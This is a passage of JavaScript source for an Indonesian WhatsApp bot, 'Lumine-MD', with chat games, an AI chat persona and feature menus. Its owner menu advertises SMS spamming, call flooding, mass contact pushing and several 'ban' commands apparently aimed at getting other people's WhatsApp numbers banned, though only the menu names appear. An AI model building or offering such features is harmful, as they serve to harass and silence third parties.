if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 qyuunee.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 qyuunee.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 qyuunee.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 qyuunee.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await qyuunee.sendText(room.x, str, m, { mentions: parseMention(str) } )
await qyuunee.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
qyuunee.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
qyuunee.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) qyuunee.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) qyuunee.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) qyuunee.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
qyuunee.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) qyuunee.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) qyuunee.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
qyuunee.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`🚫 *Jangan tag dia!*
 ❏  *Dia sedang AFK* ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
 ❏  *Selama* ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
reply(`
🕊️ ${pushname} Telah Kembali Dari Afk\n\n ❏ ${user.afkReason ? ' *Dengan Alasan* : ' + user.afkReason : ''}\n\n ❏  *Selama* : ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
            return
        }

let inactivityTimer;
function resetInactivityTimer(m) {
    if (db.data.chats[m.sender] && db.data.chats[m.sender].lumine) {
        clearTimeout(inactivityTimer);
        inactivityTimer = setTimeout(() => {
            const rexedok = pickRandom([
                "hmm apa yah... ", 
                "reply aku dong", 
                "halo sayang, lumine disini... ", 
                "meow :3", 
                "jangan spam ya kak", 
                "heeloooooooooooooo", 
                "cih.", 
                "sayangggg", 
                "MEMBER SUKI MEMBER SUKI", 
                "ehehehehehehehehehehe", 
                "kamu tau ga bedanya aku sama dia?", 
                "mau mabar genshin ga? pliss add aku 809005073", 
                "ketik 1 untuk admin suki", 
                "hey~", 
                "ルミネはここにいる~💛", 
                "Kalian main genshin?", 
                "mau primogem?", 
                "ikan.", 
                "`lumine:` .watashi"
            ]);
            qyuunee.sendMessage(m.chat, { text: rexedok}, { quoted: m });
            kirimstik("https://telegra.ph/file/d00f7d1f875b95f7a4078.png");
        }, 7 * 60 * 1000); // 7 minutes
    }
}

async function lumin(prompt) {
 
    resetInactivityTimer(m)

    try {
    
        const C = require('node-fetch')
        const spychat2 = prompt.replace().slice().trim()
        const V = await C("https://cih-cai-jir.koi.pics/cai?char=yerYQvGVUH20FJ5Qz44IClXA6xa1uyFdYc1l4FTH8j8&message=" + encodeURIComponent(spychat2));
        const L = await V.json();
        const answer = L.reply;
            const regex = emojiRegex();
            answeri = answer.replace(regex, '');
            
          
            
        if (sendStickerso) {
    
          
        //==========================//   
            if (answeri === "FOTOREQ") {
            
            m.reply("malas")
            
            } else if (answeri === "DOWNLOADING") {
   
            const lucukrek = await pickRandom([
            "siap, tunggu sebentar",
            "sabar",
            "wait, tunggu ya kak",
            "sebentar le...",
            "atau... btr",
            "okey",
            "oke sayang..",
            "bntar woi...",
            "lumine bantu ya..",
            "ya ya ya, bentar ya sayanggg",
            "apa ini? aku download ya..",
            "process",
            "agak sus",
            "cihuy, oteweii...",
            "wakatta...",
            "paimon?",
            "iyo",
            "bentar mau hitamkan gc ini dulu."])
            
            m.reply("*Lumine*\n> " + lucukrek)
            

if (prompt.match('vt.tiktok.com')) {
try {

let res = await tiktok2(`${spychat2}`)
				qyuunee.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				
                    qyuunee.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
			} catch (err) {
}} else if (prompt.match('youtu.be')) {
        try {
const ytdl = require("@distube/ytdl-core")
ytdl.getInfo(`${spychat2}`);
let mp3File = 'orhh.mp3'
ytdl(`${spychat2}`, {filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {  
await qyuunee.sendMessage(m.chat, { audio:  fs.readFileSync(mp3File), mimetype: 'audio/mp4' },{ quoted: m })
fs.unlinkSync(mp3File)
})       
} catch (err) {
    }   
    }
          } else {
           setTimeout(async  () => {
           m.reply("*Lumine*\n> " + L.reply);     
           }, 1000)
           }
           
           
           
           
           
           
        } else if (L.reply) {
            
   
   
   
   
   
   
            if (answeri === "FOTOREQ") {
            
            m.reply("capek")
            
            } else if (answeri === "DOWNLOADING") {    
   
            const lucukrek = await pickRandom([
            "siap, tunggu sebentar",
            "sabar",
            "wait, tunggu ya kak",
            "sebentar le...",
            "atau... btr",
            "okey",
            "oke sayang..",
            "bntar woi...",
            "lumine bantu ya..",
            "ya ya ya, bentar ya sayanggg",
            "apa ini? aku download ya..",
            "process",
            "agak sus",
            "cihuy, oteweii...",
            "wakatta...",
            "paimon?",
            "iyo",
            "bentar mau hitamkan gc ini dulu."])
            
            m.reply("*Lumine*\n> " + lucukrek)

if (prompt.match('vt.tiktok.com')) {
try {

let res = await tiktok2(`${spychat2}`)
				qyuunee.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				
                    qyuunee.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
			} catch (err) {
}} else if (prompt.match('youtu.be')) {
        try {
const ytdl = require("@distube/ytdl-core")
ytdl.getInfo(`${spychat2}`);
let mp3File = 'orhh.mp3'
ytdl(`${spychat2}`, {filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {  
await qyuunee.sendMessage(m.chat, { audio:  fs.readFileSync(mp3File), mimetype: 'audio/mp4' },{ quoted: m })
fs.unlinkSync(mp3File)
})       
} catch (err) {
    }   
    }
                   } else {                                                                                  
            m.reply("*Lumine*\n> " + L.reply);           
             }
                     //==========================//   
        } else {
            console.error("Answer not found in response:", response.data);
            return m.reply("No answer found in the response.");
        }
    } catch (error) {
        console.error("Error during chat request:", error);
           return m.reply("An error occurred during the chat process.");  
    }
}

async function LumineCommand(m, chat, args) {
    if (args[1] === 'on' || args[1] === 'enable') {
        chat.lumine = true;
            
          
    let lastMessageTime = new Date();



        
        
        
        m.reply('Iya sayangg... ');
        return;
    }

    if (args[1] === 'off' || args[1] === 'disable') {
        chat.lumine = false;
           
                    
                    
        m.reply('sudah.');
        return;
    }
    
    let tekssc = m.text
    
        
        
        
  
      
     if (chat.lumine) {
         if (
 m.text.startsWith(".") ||
 m.text.startsWith(">") ||      
 m.text.startsWith("#") ||
 m.text.startsWith("$") ||
 m.text.startsWith("/") ||
 m.text.startsWith("\\/")
 ) return
         
if (!m.quoted) return 

const haririltim = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)

 async function imgscan() {
 try {
 let pompa = tekssc
 let { TelegraPh } = require('./lib/uploader')
 let mediaa = await qyuunee.downloadAndSaveMediaMessage(quoted)
 let urlgambaroo = await TelegraPh(mediaa)

const lease = await fetchJson(`https://widipe.com/bardimg?url=${urlgambaroo}&text=${pompa}, tolong berbahasa indonesia`)
let seetotoota = lease.result
return m.reply("*Lumine*\n> " + seetotoota)
} catch(e) {
cconsole.log("error")
}
        
        }
  
  
 var type = m;
 if (isMedia) {
return imgscan() 
} else if (m.quoted) {
return lumin(tekssc)
 }
 
 console.log("S- [ LUMINE ]") //pengalih
  
     }
}

switch(command) {
case 'menu': 
case 'help': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
const owned = owner + "@s.whatsapp.net"
let awal = `▧ 「 *I N F O  B O T* 」
    
   ☍ Creator : *@${owned.split("@")[0]}*
   ☍ Runtime : *${runtime(process.uptime())}*
   ☍ Mode Bot : *${qyuunee.public ? `Public Mode` : `Self Mode`}*

▧ 「 *I N F O  U S E R* 」

   ☍ Name : *${pushname}*
   ☍ Number : *${m.sender.split('@')[0]}*
   ☍ Status : *${isCreator ? "Owner 🥶" : "User ⭐"}*
   
▧ 「 *S U B - M E N U* 」
│ ∘  aimenu ( *Chat/Image AI* )
│ ∘  ownermenu ( *Menu Owner* )
│ ∘  gamemenu ( *Menu Game* )
│ ∘  groupmenu ( *Menu Grup* )
│ ∘  beritamenu ( *Menu Berita* )
│ ∘  funmenu ( *Menu Fun* )
│ ∘  storemenu ( *Menu Store* )
│ ∘  domainmenu ( *Menu Domain* )
│ ∘  randommenu ( *Menu Random* )
│ ∘  panelmenu ( *Menu Panel* )
│ ∘  downmenu ( *Menu Download* )
│ ∘  weebs ( *Menu Wibu* )
│ ∘  pushkonmenu ( *Push Kontak* )
│ ∘  hoyomenu ( *Genshin / Honkai* )
│ ∘  convertmenu ( *Convert Media* )
╰──────────────━`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: awal
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "Lumine-MD V6.0"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image: fs.readFileSync('./datakoi/image/thumb.jpg')}, { upload: qyuunee.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"ALL MENU 🍂",
"sections":[{"title":"Lumine-MD V5.0",
"rows":[{"header":"AI MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}aimenu"},
{"header":"OWNER MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}ownermenu"},
{"header":"DOWNLOAD MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}downmenu"},
{"header":"GAME MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}gamemenu"},
{"header":"GROUP MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}groupmenu"},
{"header":"BERITA MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}beritamenu"},
{"header":"FUN MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}funmenu"},
{"header":"STORE MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}storemenu"},
{"header":"DOMAIN MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}domainmenu"},
{"header":"RANDOM MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}randommenu"},
{"header":"PANEL MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}panelmenu"},
{"header":"WIBU MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}weebs"},
{"header":"PUSHKON MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}pushkonmenu"},
{"header":"HOYOVERSE MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}hoyomenu"},
{"header":"CONVERT MENU",
"title":"",
"description":"🕊️ Klik Ini Untuk Membuka Fitur Diatas",
"id":"${prefix}convertmenu"}]
}]
}`
              },
              {
                "name": "cta_url",
                 "buttonParamsJson": `{"display_text":"SALURAN ‼️","url":"https://whatsapp.com/channel/0029VaA4Tmw72WTpKVP8f33G","merchant_url":"https://www.google.com"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"SCRIPT 🔖","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363201331652484@newsletter',
                  newsletterName: "🕊️ Follow Channel Aku (^^)/~~~",
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await qyuunee.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
await sleep(1500)
qyuunee.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/private.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: koi })
}
break

case 'storemenu': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
var stor = `▧ 「 *S T O R E - M E N U* 」
│ ∘  ${prefix}list
│ ∘  ${prefix}store
│ ∘  ${prefix}addlist
│ ∘  ${prefix}dellist
╰──────────────━`
qyuunee.sendMessage(from, { text: stor }, { quoted: m })
}
break

case 'groupmenu': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
reply(`▧ 「 *G R O U P - M E N U* 」
│ ∘  ${prefix}antilink on / off
│ ∘  ${prefix}antich on / off
│ ∘  ${prefix}autodown on / off
│ ∘  ${prefix}nsfw on / off
│ ∘  ${prefix}mutegc on / off
│ ∘  ${prefix}bcgc (textnya)
│ ∘  ${prefix}share (textnya)
│ ∘  ${prefix}hidetag (textnya)
│ ∘  ${prefix}kick (628xx)
│ ∘  ${prefix}add (628xx)
│ ∘  ${prefix}promote (628xx)
│ ∘  ${prefix}demote (628xx)
│ ∘  ${prefix}sendlinkgc (628xx)
│ ∘  ${prefix}editgroup close / open
│ ∘  ${prefix}editinfo on / off
│ ∘  ${prefix}join (linknya)
│ ∘  ${prefix}editsubjek (textnya)
│ ∘  ${prefix}editdesk (textnya)
│ ∘  ${prefix}tagall (textnya)
│ ∘  ${prefix}inspect (linknya)
│ ∘  ${prefix}linkgroup
│ ∘  ${prefix}resetlinkgc
│ ∘  ${prefix}promoteall
│ ∘  ${prefix}demoteall
│ ∘  ${prefix}buatsw
│ ∘  ${prefix}buatswimage
│ ∘  ${prefix}buatswvideo
│ ∘  ${prefix}swin
│ ∘  ${prefix}vnsw
│ ∘  ${prefix}buatswptv
│ ∘  ${prefix}toptv
│ ∘  ${prefix}buatsws
╰──────────────━`)
}
break

case 'downmenu': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
reply(`▧ 「 *D O W N L O A D - M E N U* 」
│ ∘  ${prefix}splay (judul)
│ ∘  ${prefix}spotify (linknya)
│ ∘  ${prefix}spotifylirik (linknya)
│ ∘  ${prefix}fb (linknya)
│ ∘  ${prefix}ig (linknya)
│ ∘  ${prefix}igdl (linknya)
│ ∘  ${prefix}twiter (linknya)
│ ∘  ${prefix}tiktok (linknya)
│ ∘  ${prefix}ttsearch (teks)
│ ∘  ${prefix}tthastag (teks)
│ ∘  ${prefix}ytmp3 (linknya)
│ ∘  ${prefix}ytmp4 (linknya)
│ ∘  ${prefix}ytsearch (linknya)
╰──────────────━`)
}
break

case 'aimenu': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
reply(`▧ 「 *A I - M E N U* 」
│ ∘  ${prefix}ai (chatGPT)
│ ∘  ${prefix}cai (characterAI)
│ ∘  ${prefix}caisetting
│ ∘  ${prefix}tts
│ ∘  ${prefix}kivotos
│ ∘  ${prefix}imgtxt
│ ∘  ${prefix}realistic
│ ∘  ${prefix}resize
│ ∘  ${prefix}animediff
│ ∘  ${prefix}animediff2
│ ∘  ${prefix}stablediff
│ ∘  ${prefix}stablediff2
╰──────────────━`)
}
break

case 'panelmenu': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
reply(`▧ 「 *P A N E L - M E N U* 」
│ ∘  ${prefix}addpanel
│ ∘  ${prefix}listusr
│ ∘  ${prefix}delusr
│ ∘  ${prefix}listsrv
│ ∘  ${prefix}delsrv
│ ∘  ${prefix}ramlist
│ ∘  ${prefix}addusr
│ ∘  ${prefix}addsrv
│ ∘  ${prefix}crateadmin
│ ∘  ${prefix}listadmin
╰──────────────━`)
}
break

case 'convertmenu': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
reply(`▧ 「 *C O N V E R T - M E N U* 」
│ ∘  ${prefix}wm
│ ∘  ${prefix}wmvideo
│ ∘  ${prefix}toimage
│ ∘  ${prefix}tomp4
│ ∘  ${prefix}tomp3
│ ∘  ${prefix}toaud
│ ∘  ${prefix}tovn
│ ∘  ${prefix}toaudio
│ ∘  ${prefix}togif
│ ∘  ${prefix}tourl
│ ∘  ${prefix}smeme
│ ∘  ${prefix}emojimix
│ ∘  ${prefix}emojimix2
│ ∘  ${prefix}attp (textnya)
│ ∘  ${prefix}ttp (textnya)
│ ∘  ${prefix}afk (textnya)
│ ∘  ${prefix}gambar (textnya)
╰──────────────━`)
}
break

case "pushkonmenu": {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
const y11 = `▧ 「 *PUSH KONTAK OTOMATIS* 」
│ ‣ ${prefix}cekidgc
│ ‣ ${prefix}pushkontakv1
│ ‣ ${prefix}pushkontakv2
│ ‣ ${prefix}savecontact
╰──────────────━`
reply(y11)
}
break

case 'randommenu': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
reply(`▧ 「 *R A N D O M - M E N U* 」
│ ∘  ${prefix}ai / openai
│ ∘  ${prefix}wangy
│ ∘  ${prefix}rate
│ ∘  ${prefix}halah
│ ∘  ${prefix}hilih
│ ∘  ${prefix}huluh
│ ∘  ${prefix}heleh
│ ∘  ${prefix}holoh
│ ∘  ${prefix}cekmati
│ ∘  ${prefix}ceksange
│ ∘  ${prefix}ceklesbi
│ ∘  ${prefix}cekme
│ ∘  ${prefix}jodoh
│ ∘  ${prefix}cekgay
│ ∘  ${prefix}cekganteng
│ ∘  ${prefix}cekcantik
│ ∘  ${prefix}owner
│ ∘  ${prefix}sticker
│ ∘  ${prefix}sewa
│ ∘  ${prefix}nope
│ ∘  ${prefix}lispanel
│ ∘  ${prefix}tutorial
│ ∘  ${prefix}quotesanime
│ ∘  ${prefix}faktaunik
│ ∘  ${prefix}katabijak
│ ∘  ${prefix}pantun
│ ∘  ${prefix}bucin
│ ∘  ${prefix}quotes
│ ∘  ${prefix}darkjokes
│ ∘  ${prefix}google
│ ∘  ${prefix}couple
│ ∘  ${prefix}coffe
│ ∘  ${prefix}getname
│ ∘  ${prefix}getpic
│ ∘  ${prefix}stalktiktok
│ ∘  ${prefix}infogempa
│ ∘  ${prefix}qc
│ ∘  ${prefix}qcstick
│ ∘  ${prefix}lirik
╰──────────────━`)
}
break

case 'domainmenu':{
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
reply(`▧ 「 *D O M A I N - M E N U* 」
│ ∘  ${prefix}domain https://qyuunee.my.id
╰──────────────━`)
}
break

case 'ownermenu': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
reply(`▧ 「 *O W N E R - M E N U* 」
│ ∘  ${prefix}sc
│ ∘  ${prefix}addcase
│ ∘  ${prefix}delcase
│ ∘  ${prefix}ban (add/del)
│ ∘  ${prefix}ambilcase
│ ∘  ${prefix}autoread on/off
│ ∘  ${prefix}getdb (database)
│ ∘  ${prefix}getuser (database user)
│ ∘  ${prefix}setppbot
│ ∘  ${prefix}setppgroup
│ ∘  ${prefix}block
│ ∘  ${prefix}unblock
│ ∘  ${prefix}spamsms (628xx)
│ ∘  ${prefix}call (628xx)
│ ∘  ${prefix}kenon (628xx)
│ ∘  ${prefix}verif@ (628xx)
│ ∘  ${prefix}banv1 (628xx)
│ ∘  ${prefix}banv2 (628xx)
│ ∘  ${prefix}banv3 (628xx)
│ ∘  ${prefix}banv4 (628xx)
│ ∘  ${prefix}banv5 (628xx)
│ ∘  ${prefix}createqr
│ ∘  ${prefix}unbannedv2 (628xx)
│ ∘  ${prefix}unbannedv3 (628xx)
│ ∘  ${prefix}unbannedv4 (628xx)
│ ∘  ${prefix}unbannedv5 (628xx)
╰──────────────━`)
}
break

case 'databasemenu': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
reply(`▧ 「 *D A T A B A S E - M E N U* 」
│ ∘  ${prefix}setcmd
│ ∘  ${prefix}delcmd
│ ∘  ${prefix}listcmd
│ ∘  ${prefix}setppbot
│ ∘  ${prefix}addpdf
│ ∘  ${prefix}delpdf
│ ∘  ${prefix}listpdf
│ ∘  ${prefix}yopdf
│ ∘  ${prefix}sendpdf
│ ∘  ${prefix}addzip
│ ∘  ${prefix}delzip
│ ∘  ${prefix}listzip
│ ∘  ${prefix}yozip
│ ∘  ${prefix}sendzip
│ ∘  ${prefix}addapk
│ ∘  ${prefix}delapk
│ ∘  ${prefix}listapk
│ ∘  ${prefix}yoapk
│ ∘  ${prefix}sendapk
│ ∘  ${prefix}addvn
│ ∘  ${prefix}delvn
│ ∘  ${prefix}listvn
│ ∘  ${prefix}addmsg
│ ∘  ${prefix}sendlist
│ ∘  ${prefix}listmsg
│ ∘  ${prefix}delmsg
│ ∘  ${prefix}getmsg
╰──────────────━`)
}
break

case 'weebs': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
reply(`▧ 「 *N S F W - W E E B S* 」
│ ∘  ${prefix}yuri
│ ∘  ${prefix}cum
│ ∘  ${prefix}ero
│ ∘  ${prefix}ass
│ ∘  ${prefix}neko2
│ ∘  ${prefix}okita
│ ∘  ${prefix}umeko
│ ∘  ${prefix}panties
│ ∘  ${prefix}mihye
│ ∘  ${prefix}merial
│ ∘  ${prefix}quan
│ ∘  ${prefix}nanaqi
│ ∘  ${prefix}onlyfans
│ ∘  ${prefix}onlyhestia
│ ∘  ${prefix}nguyenhuang
│ ∘  ${prefix}onlynoname
│ ∘  ${prefix}hentaivid
╰──────────────━

▧ 「 *S F W - W E E B S* 」
│ ∘  ${prefix}whatanime
│ ∘  ${prefix}whatmusic
│ ∘  ${prefix}loli
│ ∘  ${prefix}neko
